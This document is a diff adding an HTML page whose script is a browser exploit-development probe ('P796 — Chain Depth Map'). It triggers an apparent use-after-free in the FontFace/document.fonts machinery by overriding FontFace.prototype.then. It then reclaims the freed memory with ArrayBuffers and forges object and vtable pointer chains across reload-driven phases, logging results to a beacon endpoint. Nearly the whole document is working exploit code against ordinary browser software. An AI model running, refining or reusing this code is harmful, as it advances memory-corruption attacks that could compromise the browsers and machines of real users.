@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P796 — Chain Depth Map</title>
+<style>
+  body { background: #0c0d14; color: #d0d7de; font-family: monospace; font-size: 14px; padding: 20px; }
+  pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; color: #7ee787; font-size: 13px; white-space: pre-wrap; word-break: break-all; }
+</style>
+<script>
+'use strict';
+/* ============================================================
+ * P796 — Chain Depth Map
+ *
+ * P795 confirmed:
+ *   - self_addr = q11 - 0x68 is CORRECT
+ *   - Engine unconditionally dereferences [q1+0] → q13 (no NULL check)
+ *   - Engine unconditionally dereferences [q13+0] (Phase C crash)
+ *   - This is a 3-level dereference chain:
+ *     q1 → [q1+0]=q13 → [q13+0]=vtable? → [vtable+N]=func?
+ *
+ * P795 Phases D/E never ran (browser gave up after 3 crashes).
+ * This probe continues the chain map with fresh localStorage.
+ *
+ * Phase A: q13→q2, q2→q4, q4..q10=0 (3-level NULL vtable)
+ *   → If crash: engine reaches vtable[0], no NULL check
+ *
+ * Phase B: q13→q2, q2→q4, q4=0x4242424242424242
+ *   → If crash: confirms engine reads vtable[0] and follows it
+ *
+ * Phase C: q13→q2, q2→q4, q4..q10 all = self+0x10 (circular)
+ *   → If survive: engine reads from vtable but circular chain
+ *     prevents crash — controlled chain without code address!
+ *   → If crash: engine CALLS from vtable (needs executable addr)
+ *
+ * Phase D: q13 = q13_original (UNCHANGED, real sub-object)
+ *   → MUST survive (baseline — proves the probe structure works)
+ *
+ * Phase E: q13 = q13_original, q14 = 0x4242 (inline buffer[1])
+ *   → Tests if engine reads second inline buffer element
+ *
+ * CRASH_CLASS: HIGH — controlled pointer chain
+ * ============================================================ */
+
+window.onerror = function(msg, url, line){
+  try { var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P796-JSERR&data=' + encodeURIComponent((msg||'') + ' L' + line) + '&t=' + Date.now(), false);
+    x.send(null); } catch(e){}
+};
+
+function h16(v){ return ('0000000000000000' + BigInt(v || 0).toString(16)).slice(-16); }
+
+function b(tag, data){
+  try { var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P796-' + encodeURIComponent(tag) +
+      '&data=' + encodeURIComponent(String(data || '').slice(0, 700)) + '&t=' + Date.now(), false);
+    x.send(null); } catch(e){}
+}
+
+var out;
+function log(s){ if(out) out.textContent += s + '\n'; }
+
+function getPhase(){
+  try { return localStorage.getItem('p796_phase') || 'A'; }
+  catch(e){ return 'A'; }
+}
+function setPhase(p){
+  try { localStorage.setItem('p796_phase', p); } catch(e){}
+}
+
+function run(){
+  out = document.getElementById('out');
+  out.textContent = '';
+
+  var phase = getPhase();
+  b('BOOT', 'phase=' + phase);
+  log('P796 — Chain Depth Map — Phase ' + phase + '\n');
+
+  /* Phase D first: baseline (must survive) to prove probe works */
+  if (phase === 'A'){
+    setPhase('B');
+    log('Phase A (= P795-D): 3-level chain, vtable entries zeroed');
+    log('q13→q2(fake obj), q2→q4(fake vtable), q4..q10=0');
+    doTest('A', function(view1, q11_1, q13_1){
+      var self_addr = q11_1 - 0x68n;
+      view1[13] = self_addr + 0x10n; /* q13 → fake obj at q2 */
+      view1[2] = self_addr + 0x20n;  /* q2 → fake vtable at q4 */
+      view1[3] = 0n;
+      for (var i = 4; i <= 10; i++) view1[i] = 0n;
+      view1[14] = 0n; view1[15] = 0n; view1[16] = 0n;
+      b('A-SET', 'q13=self+0x10|q2=self+0x20|q4-q10=0|self=0x' + h16(self_addr));
+    });
+  } else if (phase === 'B'){
+    setPhase('C');
+    log('Phase B (= P795-E): 3-level chain, vtable[0] = 0x4242');
+    doTest('B', function(view1, q11_1, q13_1){
+      var self_addr = q11_1 - 0x68n;
+      view1[13] = self_addr + 0x10n;
+      view1[2] = self_addr + 0x20n;
+      view1[3] = 0n;
+      view1[4] = 0x4242424242424242n; /* crash marker at vtable[0] */
+      for (var i = 5; i <= 10; i++) view1[i] = 0n;
+      view1[14] = 0n; view1[15] = 0n; view1[16] = 0n;
+      b('B-SET', 'q13=self+0x10|q2=self+0x20|q4=0x4242|self=0x' + h16(self_addr));
+    });
+  } else if (phase === 'C'){
+    setPhase('D');
+    log('Phase C: 3-level chain, ALL vtable entries = self+0x10 (circular)');
+    log('If survive → engine reads but does not CALL from vtable');
+    doTest('C', function(view1, q11_1, q13_1){
+      var self_addr = q11_1 - 0x68n;
+      var circ = self_addr + 0x10n;
+      view1[13] = circ;
+      view1[2] = self_addr + 0x20n;
+      view1[3] = circ;
+      for (var i = 4; i <= 10; i++) view1[i] = circ;
+      view1[14] = circ; view1[15] = circ; view1[16] = circ;
+      b('C-SET', 'q13=self+0x10|q2=self+0x20|q4-q16=circ|self=0x' + h16(self_addr));
+    });
+  } else if (phase === 'D'){
+    setPhase('E');
+    log('Phase D: BASELINE — q13 = real q13 (unchanged)');
+    log('Must survive. Proves two-pass works.');
+    doTest('D', function(view1, q11_1, q13_1){
+      /* DON'T modify q13 — leave as q13_1 (real sub-object) */
+      b('D-SET', 'q13=UNCHANGED|q13=0x' + h16(q13_1));
+    });
+  } else if (phase === 'E'){
+    setPhase('F');
+    log('Phase E: q13 unchanged + q14 = 0x4242 (inline buffer[1] test)');
+    doTest('E', function(view1, q11_1, q13_1){
+      /* q13 unchanged, but set q14 = crash marker */
+      view1[14] = 0x4242424242424242n;
+      b('E-SET', 'q13=UNCHANGED|q14=0x4242');
+    });
+  } else {
+    log('All phases complete! Check beacons.');
+    b('ALLCOMPLETE', '');
+    try { localStorage.removeItem('p796_phase'); } catch(e){}
+  }
+}
+
+function doTest(label, setupFn){
+  /* Pass 1: zeroed UAF */
+  var st1 = document.createElement('style');
+  st1.textContent = '@font-face{font-family:zz1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(st1);
+
+  var face1 = new FontFace('z1', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(face1);
+  void face1.loaded;
+
+  var abs1 = [], fired1 = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (fired1) return undefined;
+      fired1 = true;
+      if (st1){ st1.remove(); st1.textContent = ''; st1 = null; }
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+      for (var k = 0; k < 64; k++) abs1.push(new ArrayBuffer(192));
+      try { document.fonts.check('1em zz1'); } catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },
+    set: function(){}
+  });
+
+  document.fonts.load('1em z1, zz1', 'AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    var best1 = -1;
+    for (var i = 0; i < abs1.length; i++){
+      var v = new BigUint64Array(abs1[i]);
+      if (v[0] === 1n){ best1 = i; break; }
+    }
+    if (best1 < 0){
+      b(label + '-P1-MISS', 'no_reclaim');
+      log('Pass 1 MISS. Retrying same phase...');
+      setPhase(label);
+      setTimeout(function(){ location.reload(); }, 500);
+      return;
+    }
+
+    var view1 = new BigUint64Array(abs1[best1]);
+    var q11_1 = view1[11];
+    var q13_1 = view1[13];
+
+    b(label + '-P1-HIT', 'q11=0x' + h16(q11_1) + '|q13=0x' + h16(q13_1));
+    log('P1 HIT: q11=0x' + h16(q11_1) + ' q13=0x' + h16(q13_1));
+
+    /* Apply test-specific modifications */
+    setupFn(view1, q11_1, q13_1);
+
+    /* Warmup */
+    for (var i = 0; i < 128; i++) new ArrayBuffer(192);
+
+    /* Pass 2: q1 = q11 → engine follows into our data */
+    var st2 = document.createElement('style');
+    st2.textContent = '@font-face{font-family:zz2;src:local(Arial);unicode-range:U+0044;}';
+    document.head.appendChild(st2);
+
+    var face2 = new FontFace('z2', 'local(Helvetica)', { unicodeRange: 'U+0043' });
+    document.fonts.add(face2);
+    void face2.loaded;
+
+    var abs2 = [], fired2 = false;
+    Object.defineProperty(FontFace.prototype, 'then', {
+      configurable: true,
+      get: function(){
+        if (fired2) return undefined;
+        fired2 = true;
+        if (st2){ st2.remove(); st2.textContent = ''; st2 = null; }
+        try { document.fonts.delete(this); } catch(e){}
+        document.body.offsetHeight;
+
+        for (var k = 0; k < 64; k++){
+          var ab = new ArrayBuffer(192);
+          var v = new BigUint64Array(ab);
+          v[1] = q11_1;
+          abs2.push(ab);
+        }
+
+        try { document.fonts.check('1em zz2'); } catch(e){}
+        document.body.offsetHeight;
+        return undefined;
+      },
+      set: function(){}
+    });
+
+    document.fonts.load('1em z2, zz2', 'CD');
+
+    setTimeout(function(){
+      delete FontFace.prototype.then;
+
+      var best2 = -1;
+      for (var i = 0; i < abs2.length; i++){
+        var v = new BigUint64Array(abs2[i]);
+        if (v[0] === 1n){ best2 = i; break; }
+      }
+
+      if (best2 < 0){
+        b(label + '-P2-MISS', 'no_reclaim');
+        log('Pass 2 MISS');
+      } else {
+        var view2 = new BigUint64Array(abs2[best2]);
+        b(label + '-P2-HIT', 'i=' + best2 +
+          '|q0=0x' + h16(view2[0]) +
+          '|q1=0x' + h16(view2[1]) +
+          '|q11=0x' + h16(view2[11]) +
+          '|q13=0x' + h16(view2[13]));
+        log('P2 HIT (#' + best2 + '):');
+        for (var q = 0; q < 24; q++){
+          if (view2[q] !== 0n) log('  q' + q + ' = 0x' + h16(view2[q]));
+        }
+
+        /* Check pass1 AB for any side-effects from chain traversal */
+        var sideEffects = [];
+        for (var q = 0; q < 24; q++){
+          if (q === 0 || q === 11 || q === 12 || q === 13) continue;
+          var v = view1[q];
+          if (v !== 0n){
+            /* Only report if we didn't set it in setupFn */
+            sideEffects.push('q' + q + '=0x' + h16(v));
+          }
+        }
+        if (sideEffects.length > 0){
+          b(label + '-SIDEEFFECT', sideEffects.join('|').slice(0, 600));
+          log('Pass1 AB non-zero fields: ' + sideEffects.join(', '));
+        }
+      }
+
+      b(label + '-SURVIVED', 'pass2_complete');
+      log('\n*** Phase ' + label + ' SURVIVED ***\n');
+
+      setTimeout(function(){ location.reload(); }, 500);
+    }, 500);
+  }, 400);
+}
+
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+</script>
+</head>
+<body>
+  <pre id="out">P796 — Chain Depth Map — Loading...</pre>
+</body>
+</html>
